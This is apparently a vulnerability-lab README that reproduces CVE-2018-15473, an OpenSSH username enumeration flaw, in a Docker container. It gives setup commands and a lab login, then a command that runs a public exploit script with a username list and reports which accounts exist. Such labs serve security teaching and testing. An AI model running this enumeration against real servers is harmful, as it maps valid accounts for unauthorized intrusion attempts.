# OpenSSH Username Enumeration Vulnerability (CVE-2018-15473)

There is a username enumeration vulnerability before OpenSSH 7.7. Through this vulnerability, an attacker can determine whether a username exists on the target host.

Reference link:

- http://openwall.com/lists/oss-security/2018/08/15/5
- https://github.com/Rhynorater/CVE-2018-15473-Exploit
- https://www.anquanke.com/post/id/157607

## vulnerability environment

Compile and start a container running OpenSSH 7.7p1 by executing the following command:

```
Docker-compose build
Docker-compose up -d
```

After the environment is started, we execute `ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@your-ip -p20022` on the client and enter the password `vulhub` to log in to the container.

## Vulnerability recurrence

Enumerate the username in the dictionary using [CVE-2018-15473-Exploit] (https://github.com/Rhynorater/CVE-2018-15473-Exploit):

```
Python3 sshUsernameEnumExploit.py --port 20022 --userList exampleInput.txt your-ip
```

![](1.png)

It can be seen that `root`, `example`, `vulhub`, `nobody` are the existing users, and `rootInvalid`, `user`, `phithon` are users that do not exist.